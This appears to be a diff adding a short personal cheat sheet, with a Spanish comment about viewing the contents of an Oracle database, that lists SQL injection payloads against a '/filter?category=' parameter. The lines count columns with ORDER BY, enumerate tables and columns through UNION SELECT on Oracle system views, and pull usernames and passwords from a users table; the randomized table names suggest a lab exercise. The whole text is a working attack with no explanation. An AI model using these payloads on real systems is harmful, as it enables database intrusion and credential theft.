@@ -1,0 +1,5 @@
+// Ver el contendido de una base de datos ORACLE
+/filter?category=Gifts' ORDER BY 2 -- -
+/filter?category=Gifts' UNION SELECT '1',table_name FROM all_tables -- -
+/filter?category' UNION SELECT '1',column_name FROM all_tab_columns WHERE table_name='APP_USERS_AND_ROLES' -- -
+/filter?category=' UNION SELECT USERNAME_FQIZUW,PASSWORD_UZBUWV FROM USERS_SWIIMJ -- -
